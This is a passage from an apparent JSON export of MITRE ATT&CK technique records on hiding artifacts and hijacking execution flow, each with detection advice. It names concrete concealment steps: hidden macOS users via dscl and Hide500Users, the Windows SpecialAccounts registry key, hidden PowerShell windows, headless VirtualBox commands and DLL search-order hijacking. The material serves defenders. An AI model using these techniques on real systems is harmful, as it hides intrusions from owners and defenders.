citations":"(Citation: FireEye Bootkits),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Kaspersky Equation QA),(Citation: ESET ComRAT May 2020),(Citation: Kaspersky Regin),"}
{"ID":"T1564.001","name":"Hide Artifacts: Hidden Files and Directories","description":"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.","url":"https://attack.mitre.org/techniques/T1564/001","created":"26 February 2020","last modified":"29 March 2020","version":"1.0","tactics":"Defense Evasion","detection":"Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":"Host forensic analysis","contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Securelist Calisto July 2018),(Citation: Trusteer Carberp October 2010),(Citation: Unit 42 Rocke January 2019),(Citation: McAfee Sharpshooter December 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Trend Micro DRBControl February 2020),(Citation: ESET LoudMiner June 2019),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Radware Micropsia July 2018),(Citation: Proofpoint TA416 Europe March 2022),(Citation: NCC Group WastedLocker June 2020),(Citation: ESET InvisiMole June 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: Talos Rocke August 2018),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Machete July 2019),(Citation: ESET Okrum July 2019),(Citation: ESET OceanLotus macOS April 2019),(Citation: Infoblox Lokibot January 2019),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: objsee mac malware 2017),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: CoinTicker 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Talos Seduploader Oct 2017),(Citation: Unit 42 BackConfig May 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Carbon Black Shlayer Feb 2019),(Citation: wardle evilquest parti),(Citation: Lazarus APT January 2022),(Citation: Avira Mustang Panda January 2020),(Citation: ESET Attor Oct 2019),(Citation: Sofacy Komplex Trojan),(Citation: Symantec Calisto July 2018),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Talos PoetRAT April 2020),(Citation: LogRhythm WannaCry),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: alientvault macspy),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: TrendMicro MacOS April 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Trend Micro Black Basta October 2022),"}
{"ID":"T1564.002","name":"Hide Artifacts: Hidden Users","description":"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.","url":"https://attack.mitre.org/techniques/T1564/002","created":"13 March 2020","last modified":"19 April 2022","version":"1.2","tactics":"Defense Evasion","detection":"Monitor for users that may be hidden from the login screen but still present in additional artifacts of usage such as directories and authentication logs. \n\nMonitor processes and command-line events for actions that could be taken to add a new user and subsequently hide it from login screens. Monitor Registry events for modifications to the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> key.\n\nIn macOS, monitor for commands, processes, and file activity in combination with a user that has a userID under 500.(Citation: Cybereason OSX Pirrit) Monitor for modifications to set the <code>Hide500Users</code> key value to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Monitor the command line for usage of the <code>dscl . create</code> command with the <code>IsHidden</code> attribute set to <code>1</code>.(Citation: Apple Support Hide a User Account) ","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, User Account: User Account Creation, User Account: User Account Metadata, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":null,"contributors":"Omkar Gudhate","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: FireEye SMOKEDHAM June 2021),"}
{"ID":"T1564.003","name":"Hide Artifacts: Hidden Window","description":"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)","url":"https://attack.mitre.org/techniques/T1564/003","created":"13 March 2020","last modified":"15 March 2022","version":"1.1","tactics":"Defense Evasion","detection":"Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":null,"contributors":"Travis Smith, Tripwire","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ClearSky Wilted Tulip July 2017),(Citation: Medium Metamorfo Apr 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: PTSecurity Higaisa 2020),(Citation: TrendMicro BlackTech June 2017),(Citation: ESET InvisiMole June 2020),(Citation: Unit 42 Gamaredon February 2022),(Citation: McAfee Cuba April 2021),(Citation: Alperovitch 2014),(Citation: FireEye APT32 May 2017),(Citation: Bromium Ursnif Mar 2017),(Citation: Talos Kimsuky Nov 2021),(Citation: PWC KeyBoys Feb 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: Unit 42 Inception November 2018),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: FireEye Operation Double Tap),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Carbon Black HotCroissant April 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Secureworks MCMD July 2019),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: Talos Promethium June 2020),(Citation: Microsoft Actinium February 2022),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: McAfee APT28 DDE1 Nov 2017),(Citation: Check Point Meteor Aug 2021),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: objective-see windtail1 dec 2018),(Citation: FireEye APT29),(Citation: FireEye APT19),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"T1564.004","name":"Hide Artifacts: NTFS File Attributes","description":"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)","url":"https://attack.mitre.org/techniques/T1564/004","created":"13 March 2020","last modified":"29 March 2020","version":"1.0","tactics":"Defense Evasion","detection":"Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)\n\nThere are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.\n\nThe Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)","platforms":"Windows","data sources":"Command: Command Execution, File: File Metadata, File: File Modification, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":"Anti-virus, Host forensic analysis, Signature-based detection","contributors":"Oddvar Moe, @oddvarmoe; Red Canary","permissions required":null,"supports remote":null,"system requirements":"NTFS partitioned hard drive","impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET LoJax Sept 2018),(Citation: Mandiant APT41),(Citation: Cisco DNSMessenger March 2017),(Citation: LOLBAS Expand),(Citation: Ciubotariu 2014),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Unit 42 Valak July 2020),(Citation: Cybereason Valak May 2020),(Citation: Kaspersky Regin),(Citation: LOLBAS Esentutl),(Citation: SentinelOne Valak June 2020),(Citation: ESET Gazer Aug 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Volexity PowerDuke November 2016),(Citation: InsiderThreat NTFS EA Oct 2017)"}
{"ID":"T1564.010","name":"Hide Artifacts: Process Argument Spoofing","description":"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)\n\nAdversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)\n\nThis behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.","url":"https://attack.mitre.org/techniques/T1564/010","created":"19 November 2021","last modified":"29 November 2021","version":"1.0","tactics":"Defense Evasion","detection":"Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution. These changes may bypass process creation detection and/or later process memory analysis. Consider monitoring for [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments.","platforms":"Windows","data sources":"Process: Process Creation","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye FiveHands April 2021),"}
{"ID":"T1564.009","name":"Hide Artifacts: Resource Forking","description":"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)","url":"https://attack.mitre.org/techniques/T1564/009","created":"12 October 2021","last modified":"05 May 2022","version":"1.0","tactics":"Defense Evasion","detection":"Identify files with the <code>com.apple.ResourceFork</code> extended attribute and large data amounts stored in resource forks. \n\nMonitor command-line activity leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections. ","platforms":"macOS","data sources":"Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":"Gatekeeper, Notarization","contributors":"Ivan Sinyakov; Jaron Bradley @jbradley89","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: tau bundlore erika noerenberg 2020),(Citation: sentinellabs resource named fork 2020),(Citation: OSX Keydnap malware),(Citation: Apple App Security Overview)"}
{"ID":"T1564.006","name":"Hide Artifacts: Run Virtual Instance","description":"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)","url":"https://attack.mitre.org/techniques/T1564/006","created":"29 June 2020","last modified":"14 October 2021","version":"1.1","tactics":"Defense Evasion","detection":"Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring the size of virtual machines running on the system. Adversaries may create virtual images which are smaller than those of typical virtual machines.(Citation: Shadowbunny VM Defense Evasion) Network adapter information may also be helpful in detecting the use of virtual instances.\n\nConsider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a silent installation may be especially suspect (ex. <code>-silent</code>, <code>-ignore-reboot</code>), as well as those associated with running a headless (in the background with no UI) virtual instance (ex. <code>VBoxManage startvm $VM --type headless</code>).(Citation: Shadowbunny VM Defense Evasion) Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity (ex. <code>VBoxManage.exe setextradata global GUI/SuppressMessages \"all\"</code>).\n\nMonitor for commands which enable hypervisors such as Hyper-V.  If virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for [Windows Service](https://attack.mitre.org/techniques/T1543/003), with respect to virtualization software. \n\nBenign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, Image: Image Metadata, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":null,"contributors":"Janantha Marasinghe; Johann Rehberger; Menachem Shafran, XM Cyber","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Sophos Maze VM September 2020),(Citation: ESET LoudMiner June 2019),(Citation: Sophos Ragnar May 2020),"}
{"ID":"T1564.007","name":"Hide Artifacts: VBA Stomping","description":"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)","url":"https://attack.mitre.org/techniques/T1564/007","created":"17 September 2020","last modified":"15 October 2021","version":"1.1","tactics":"Defense Evasion","detection":"Detection efforts should be placed finding differences between VBA source code and p-code.(Citation: Walmart Roberts Oct 2018) VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code.(Citation: pcodedmp Bontchev)(Citation: oletools toolkit)\n\nIf the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if the <code>PROJECT</code> stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to the <code>PROJECT</code> stream will inhibit attempts of reading the VBA source code through the GUI.(Citation: FireEye VBA stomp Feb 2020)","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":null,"contributors":"Rick Cole, Mandiant","permissions required":"User","supports remote":null,"system requirements":"MS Office version specified in <code>_VBA_PROJECT</code> stream must match host","impact type":null,"effective permissions":null,"relationship citations":",(Citation: Microsoft Disable VBA Jan 2020)"}
{"ID":"T1574","name":"Hijack Execution Flow","description":"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.","url":"https://attack.mitre.org/techniques/T1574","created":"12 March 2020","last modified":"05 May 2022","version":"1.2","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nMonitor for changes to environment variables, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Service: Service Metadata, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Application Control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FOX-IT May 2016 Mofang),(Citation: Mandiant APT41),(Citation: CyberBit Dtrack),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft More information about DLL),(Citation: Powersploit),(Citation: Microsoft Dynamic Link Library Search Order),(Citation: Microsoft CreateProcess),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Executable Installers are Vulnerable),(Citation: Vulnerability and Exploit Detector),(Citation: FireEye DLL Side-Loading)"}
{"ID":"T1574.012","name":"Hijack Execution Flow: COR_PROFILER","description":"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)","url":"https://attack.mitre.org/techniques/T1574/012","created":"24 June 2020","last modified":"30 August 2021","version":"1.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":null,"contributors":"Jesse Brown, Red Canary","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Secureworks DarkTortilla Aug 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker)"}
{"ID":"T1574.001","name":"Hijack Execution Flow: DLL Search Order Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.","url":"https://attack.mitre.org/techniques/T1574/001","created":"13 March 2020","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of `.manifest` and `.local` redirection files that do not correlate with software updates are suspicious.","platforms":"Windows","data sources":"File: File Creation, File: File Modification, Module: Module Load","is sub-technique":true,"sub-technique of":"T1574","defenses 